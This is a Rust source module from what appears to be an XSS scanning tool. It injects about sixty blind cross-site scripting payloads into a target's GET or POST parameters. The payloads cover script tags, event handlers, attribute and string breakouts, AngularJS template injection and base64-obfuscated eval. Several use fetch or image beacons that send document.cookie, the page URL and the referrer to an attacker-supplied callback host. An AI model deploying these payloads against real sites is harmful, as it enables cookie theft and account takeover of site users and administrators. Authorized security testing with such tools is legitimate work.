/// Blind XSS - inject out-of-band callback payloads into all sinks.
/// The callback URL (e.g. a Burp Collaborator or interactsh URL) will
/// receive a hit when the payload executes in an admin panel, logs, etc.

use crate::{crawler::DiscoveredTarget, http::HttpClient};
use anyhow::Result;
use colored::*;

pub async fn inject(
    client: &HttpClient,
    target: &DiscoveredTarget,
    param: &str,
    callback: &str,
    verbose: bool,
) -> Result<()> {
    let payloads = blind_payloads(callback);

    for payload in &payloads {
        if target.method == "POST" {
            let data = target
                .post_data
                .as_deref()
                .map(|d| crate::http::inject_data(d, param, payload))
                .unwrap_or_default();
            let _ = client.post(&target.url, &data).await;
        } else {
            let url = crate::http::inject_param_url(&target.url, param, payload)?;
            let _ = client.get(&url).await;
        };

        if verbose {
            println!(
                "    {} Injected blind payload into '{}': {}",
                "[Blind]".magenta(),
                param.yellow(),
                payload.dimmed()
            );
        }
    }

    Ok(())
}

fn load_script(cb: &str) -> String {
    format!("var s=document.createElement('script');s.src='{}';document.head.appendChild(s)", cb)
}

fn fetch_beacon(cb: &str) -> String {
    format!("fetch('{}',{{method:'POST',body:JSON.stringify({{c:document.cookie,u:location.href,r:document.referrer,t:document.title}}),headers:{{'Content-Type':'application/json'}}}})", cb)
}

fn img_beacon(cb: &str) -> String {
    format!("new Image().src='{}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)", cb)
}

fn blind_payloads(cb: &str) -> Vec<String> {
    let load = load_script(cb);
    let fetch = fetch_beacon(cb);
    let img = img_beacon(cb);

    vec![
        // Script tag variants
        format!("<script src=\"{}\"></script>", cb),
        format!("<script src='{}'></script>", cb),
        format!("<SCRIPT SRC=\"{}\"></SCRIPT>", cb),
        format!("<script src=\"{}\" crossorigin></script>", cb),

        // HTML element event handlers
        format!("<img src=x onerror=\"{}\">", load),
        format!("<img src=x onerror='{}'>", load),
        format!("<img src=\"{}\" onerror=\"{}\">", cb, load),
        format!("<svg onload=\"{}\">", load),
        format!("<svg/onload=\"{}\">", load),
        format!("<body onload=\"{}\">", load),
        format!("<iframe onload=\"{}\"></iframe>", load),
        format!("<video src=x onerror=\"{}\">", load),
        format!("<audio src=x onerror=\"{}\">", load),
        format!("<details open ontoggle=\"{}\">", load),
        format!("<input autofocus onfocus=\"{}\">", load),
        format!("<select autofocus onfocus=\"{}\">", load),
        format!("<textarea autofocus onfocus=\"{}\">", load),
        format!("<marquee onstart=\"{}\">", load),
        format!("<object data=\"javascript:{}\">", load),

        // Attribute breakout - HTML
        format!("\"><script src=\"{}\"></script>", cb),
        format!("'><script src=\"{}\"></script>", cb),
        format!("\"><img src=x onerror=\"{}\">", load),
        format!("\" onmouseover=\"{}\" x=\"", load),
        format!("' onmouseover='{}' x='", load),
        format!("\" autofocus onfocus=\"{}\" x=\"", load),
        format!("\" onpointerover=\"{}\" x=\"", load),
        format!("\" onanimationstart=\"{}\" style=\"animation-name:x\" x=\"", load),

        // JavaScript string breakout
        format!("';{}//'", load),
        format!("\";{}//\"", load),
        format!("`; {}//`", load),
        format!("'-({})+'", fetch),
        format!("\"-({})\"", fetch),
        format!("\\';{}//", load),

        // Javascript: / data: URL context
        format!("javascript:{}", load),
        format!("javascript:void({})", fetch),
        format!("javascript:eval('{}')", load),
        format!("data:text/html,<script src=\"{}\"></script>", cb),

        // fetch() / XHR beacon (works when script-src blocks external src)
        format!("<script>{}</script>", fetch),
        format!("<svg onload=\"{}\">", fetch),
        format!("\";{}//", fetch),
        format!("';{}//", fetch),

        // Image CSS beacon (passive — no JS execution needed)
        format!("<img src=\"{}?passive=1\">", cb),
        format!("<link rel=stylesheet href=\"{}\">", cb),
        format!("<script>{}</script>", img),

        // DOM breakout via innerHTML / document.write sinks
        format!("<img src=x onerror=eval(atob('{}'))>",
            base64_encode(&load)),
        format!("<script>eval(atob('{}'))</script>",
            base64_encode(&fetch)),

        // Event handler inside style attribute (CSS expression - IE)
        format!("\" style=\"background:url(javascript:{})\" x=\"", load),

        // AngularJS template injection
        format!("{{{{constructor.constructor('{}')()}}}}", load),
        format!("{{{{$on.constructor('{}')()}}}}", load),

        // Markdown / template engine breakout
        format!("[x](javascript:{})", load),
        format!("![x](javascript:{})", load),
        format!("<a href=\"javascript:{}\">click</a>", load),

        // postMessage-based (triggers if page has insecure message handler)
        format!("<script>window.postMessage('<img src=x onerror=\"{}\">', '*')</script>", load),

        // iframe srcdoc
        format!("<iframe srcdoc=\"&lt;script src=&quot;{}&quot;&gt;&lt;/script&gt;\"></iframe>", cb),

        // SVG + use + xlink (for older browsers/SVG namespace bypass)
        format!("<svg><use href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>{}</script></svg>#x\"></use></svg>", load),

        // Comment breakout
        format!("--><script src=\"{}\"></script><!--", cb),
        format!("--><img src=x onerror=\"{}\"><!--", load),

        // Title/textarea/noscript/style breakout
        format!("</title><script src=\"{}\"></script>", cb),
        format!("</textarea><script src=\"{}\"></script>", cb),
        format!("</noscript><script src=\"{}\"></script>", cb),
        format!("</style><script src=\"{}\"></script>", cb),
        format!("</script><script src=\"{}\"></script>", cb),
    ]
}

fn base64_encode(s: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    STANDARD.encode(s)
}
